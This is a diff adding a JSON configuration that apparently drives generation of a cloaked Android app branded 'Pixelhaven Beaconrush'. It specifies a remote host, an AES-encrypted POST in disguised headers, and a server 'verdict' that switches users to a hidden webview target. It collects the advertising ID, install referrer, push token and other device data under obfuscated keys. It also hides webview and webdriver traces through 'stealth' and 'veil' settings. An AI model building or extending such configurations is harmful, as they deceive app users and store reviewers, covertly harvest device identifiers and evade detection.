@@ -1,0 +1,123 @@
+{
+  "schema": 1,
+  "app": {
+    "application_id": "com.pixelhaven.beaconrush",
+    "platform": "android"
+  },
+  "seed": {
+    "nonce": "5f10380a-99b3-4324-99b3-47f593bcba3c",
+    "created_at": "2026-09-22T09:18:28.489Z"
+  },
+  "identity": {
+    "worker_host": "beaconrush.shop",
+    "slug": "beaconrush12",
+    "channel": "beaconrush12_alerts"
+  },
+  "surface": {
+    "product": "pixelhaven beaconrush",
+    "label": "Pixelhaven Beaconrush",
+    "tokens": [
+      "pixelhaven",
+      "beaconrush"
+    ]
+  },
+  "hop": {
+    "method": "POST",
+    "path": "/z/848dee",
+    "envelope": "headers",
+    "header_names": [
+      "X-f7e7-H0",
+      "X-e748-H1"
+    ],
+    "crypto": "aes-256-cbc"
+  },
+  "verdict": {
+    "state": "phase",
+    "href": "target",
+    "sticky": "keep",
+    "ttl": "until",
+    "pass": "pe7",
+    "off": "n48"
+  },
+  "collect": {
+    "uid": "rid848d",
+    "gaid": "adv8dee",
+    "install_referrer": "irefeef7",
+    "model": "mdlf7e7",
+    "os_version": "osve748",
+    "sdk_int": "sdk487f",
+    "locale": "loc7f9c",
+    "timezone": "tzn9c43",
+    "app_version": "avn43cb",
+    "build": "bldcbbc",
+    "push_token": "ptkbc47",
+    "language": "lng47d5",
+    "country": "ctyd5f0"
+  },
+  "push": {
+    "delivered": "/u/43cbbc/d/{id}",
+    "opened": "/u/43cbbc/o/{id}"
+  },
+  "webview": {
+    "js_name": "Jsbc47",
+    "js_methods": [
+      "putd5",
+      "pingf0"
+    ],
+    "ua_strip": [
+      "; wv"
+    ],
+    "stealth": [
+      "webdriver"
+    ]
+  },
+  "http": {
+    "client": "urlconnection",
+    "async": "coroutine"
+  },
+  "manifest": {
+    "provider_suffix": "0654",
+    "queries": "minimal",
+    "download_channel": "beaconrush12_dl"
+  },
+  "rewrite": {
+    "module_shape": "application_host",
+    "boot_style": "two_phase_activity",
+    "folders": [
+      "port",
+      "bin",
+      "deck"
+    ],
+    "storage": "file",
+    "storage_names": [
+      "beaconrush12_runtime",
+      "beaconrush12_surface"
+    ],
+    "boot_cut": [
+      "ids",
+      "hop",
+      "decide",
+      "open"
+    ]
+  },
+  "fcm": {
+    "id_keys": [
+      "ticket"
+    ],
+    "url_keys": [
+      "go_url"
+    ]
+  },
+  "flags": {
+    "r8": true,
+    "cleartext": true,
+    "warmup_ms": 2250,
+    "response_legacy_aliases": [],
+    "veil_mask_format": "beaconrush12.k.7f9c"
+  },
+  "frozen": {
+    "upstream": "POST /click-handler",
+    "collection": "org-standard",
+    "webview": "org-standard"
+  }
+}
